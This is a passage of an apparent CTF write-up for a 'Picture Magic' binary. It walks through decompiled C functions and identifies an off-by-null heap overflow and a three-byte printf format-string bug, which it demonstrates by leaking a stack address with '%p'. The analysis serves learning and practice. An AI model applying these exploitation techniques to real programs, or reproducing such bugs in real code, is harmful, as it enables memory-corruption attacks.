+<span class="mtk1">  row </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (p-&gt;height </span><span class="mtk5">&lt;=</span><span class="mtk1"> row) {</span>
+<span class="mtk1">      p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> p-&gt;height] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (column </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; column </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;width; column</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">      cc </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+<span class="mtk1">      c </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">) cc;</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((c </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid character detected!"</span><span class="mtk1">);</span>
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>  
+<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> (; column </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;width </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">; column</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">          p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> row </span><span class="mtk5">+</span><span class="mtk1"> column] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">' '</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> row </span><span class="mtk5">+</span><span class="mtk1"> column] </span><span class="mtk5">=</span><span class="mtk1"> c;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> (row </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtk1">    row</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>It might look a bit weird, but it allows us to enter some data for each row (byte by byte). Some other considerations:</p><ul><li>If we hit <code>ENTER</code> (<code>\n</code>), the program will fill the remaining space in the row with white spaces and a new line character at last</li><li>The program will add a null byte at the end of the picture</li></ul><p>Here we have a subtle (but powerful) vulnerability, as we will see later. The thing is that, if we create a picture with <code>p->width = 0x4f0</code> and <code>p->height = 1</code>, the program will allow us to enter some data, fill the rest with white spaces and a new line character at the end. But there will also happen that <code>p->data[0x4f0 * 1] = '\0'</code>. This index is out of bounds, so we have an overflow by a null byte (also known as off-by-null).</p><p>For the moment, let&rsquo;s continue analyzing functions.</p><h3 id="edit-function">Edit function</h3><p>This is not actually a simple way to edit pictures, but here we have it:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">transform_picture</span><span class="mtk1">() {</span>
+<span class="mtk1">  uchar size;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> row;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> column;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> type[</span><span class="mtk6">5</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_index</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (((index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index)) </span><span class="mtk5">||</span><span class="mtk1"> (pictures[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid picture index!"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    p </span><span class="mtk5">=</span><span class="mtk1"> pictures[index];</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Transformation type (mul/add/sub/div): "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">27</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(type, </span><span class="mtk6">5</span><span class="mtk1">, stdin);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (((type[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'m'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (type[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'a'</span><span class="mtk1">)) </span><span class="mtk5">||</span><span class="mtk1"> ((type[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'s'</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> (type[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'d'</span><span class="mtk1">)))) {</span>  
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Transformation size: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">15</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%hhu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">size);</span>
+<span class="mtk1">      </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Transformation row (-1 for all): "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">21</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">row);</span>
+<span class="mtk1">      </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((row </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> ((</span><span class="mtk7 mtki">uint</span><span class="mtk1">) row </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;height)) {</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Transformation column (-1 for all): "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">24</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">        </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">column);</span>
+<span class="mtk1">        </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((column </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> ((</span><span class="mtk7 mtki">uint</span><span class="mtk1">) column </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;width)) {</span>
+<span class="mtk1">          </span><span class="mtk8">transform_row</span><span class="mtk1">(p, size, row, column, type[</span><span class="mtk6">0</span><span class="mtk1">]);</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">          </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid column, out of range!"</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid row, out of range!"</span><span class="mtk1">);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid transformation type!"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>This function asks for an index (<code>0</code> to <code>3</code>) using <code>get_index</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">get_index</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Picture index: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">f</span><span class="mtk1">, stdout);</span>  
+<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> index;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>And then asks for an operation (<code>add</code>, <code>sub</code>, <code>mul</code>, <code>div</code>), a size (this variable name should not be called as such, it makes no sense), a row and a column to apply the transformation. Then, <code>transform_picture</code> will call <code>transform_row</code>, this one calls <code>transform_column</code> and finally, <code>transform_final</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">transform_final</span><span class="mtk1">(</span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">r</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">c</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">type</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (type </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'a'</span><span class="mtk1">) {</span>
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">=</span><span class="mtk1"> p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">+</span><span class="mtk1"> size;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (type </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'s'</span><span class="mtk1">) {</span>
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">=</span><span class="mtk1"> p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">-</span><span class="mtk1"> size;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (type </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'m'</span><span class="mtk1">) {</span>
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">=</span><span class="mtk1"> p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">*</span><span class="mtk1"> size;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (type </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'d'</span><span class="mtk1">) {</span>
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">=</span><span class="mtk1"> p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">/</span><span class="mtk1"> size;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">) {</span>
+<span class="mtk1">    p-&gt;data[p-&gt;width </span><span class="mtk5">*</span><span class="mtk1"> r </span><span class="mtk5">+</span><span class="mtk1"> c] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">' '</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">transform_col</span><span class="mtk1">(</span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">row</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">column</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">type</span><span class="mtk1">) {</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> c;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (column </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; c </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;width; c</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">transform_final</span><span class="mtk1">(p, size, row, c, type);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">transform_final</span><span class="mtk1">(p, size, row, column, type);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">transform_row</span><span class="mtk1">(</span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">row</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">column</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk9 mtki">type</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> r;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (row </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (r </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; r </span><span class="mtk5">&lt;</span><span class="mtk1"> p-&gt;height; r</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">transform_col</span><span class="mtk1">(p, size, r, column, type);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">transform_col</span><span class="mtk1">(p, size, row, column, type);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>One thing to notice is that we cannot have null bytes in our images. Every null byte that appears after the transformation will be replaced by a white space&mldr;</p><h3 id="free-function">Free function</h3><p>This is the function to delete (sell) pictures (<code>sell_picture</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">sell_picture</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> index_newline;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> price[</span><span class="mtk6">4</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> yn[</span><span class="mtk6">4</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_index</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (((index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index)) </span><span class="mtk5">||</span><span class="mtk1"> (pictures[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid picture index!"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    p </span><span class="mtk5">=</span><span class="mtk1"> pictures[index];</span>
+<span class="mtk1">    </span><span class="mtk8">print_picture</span><span class="mtk1">(p);</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">How much do you want to sell the picture for? "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">2f</span><span class="mtk1">, stdout);</span>  
+<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(price, </span><span class="mtk6">4</span><span class="mtk1">, stdin);</span>
+<span class="mtk1">    index_newline </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcspn</span><span class="mtk1">(price, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">    price[index_newline] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(price, </span><span class="mtk4">"0"</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Picture is put up for sale at the price of $"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(price);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">".</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">No-one wants to buy your picture :</span><span class="mtk6">\'</span><span class="mtk4">("</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Do you want to throw it away instead? (y/N) "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">2c</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">      </span><span class="mtk8">fgets</span><span class="mtk1">(yn, </span><span class="mtk6">3</span><span class="mtk1">, stdin);</span>
+
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((yn[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'y'</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (yn[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'Y'</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You toss the picture away."</span><span class="mtk1">);</span>
+<span class="mtk1">    pictures[index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(p);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Here we have a Format String vulnerability we can input any price and it will be used as the first argument of <code>printf</code>. The limitation is that we only have <code>3</code> bytes, since <code>fgets(price, 4, stdin)</code> only reads <code>3</code> bytes (plus new line character). Therefore, this vulnerability can only be used to leak a stack address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">+------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; 1
+
+Width: 0
+Height: 0
+
+Reading picture into buffer:
+================================
+================================
+Successfully read picture!
+Picture has been assigned index 0.
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; 4
+
+Picture index: 0
+
+================================
+================================
+
+How much do you want to sell the picture for? %p
+
+Picture is put up for sale at the price of $0x7ffcffdca640.  
+
+.
+.
+.
+
+No-one wants to buy your picture :'(
+Do you want to throw it away instead? (y/N)
+</code></pre></div><p>This will be useful to compute the absolute address of <code>name</code> at runtime.</p><h3 id="show-function">Show function</h3><p>There is also a function fo show a picture, but this time it is irrelevant for exploitation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">show_picture</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_index</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (((index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index)) </span><span class="mtk5">||</span><span class="mtk1"> (pictures[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid picture index!"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">print_picture</span><span class="mtk1">(pictures[index]);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
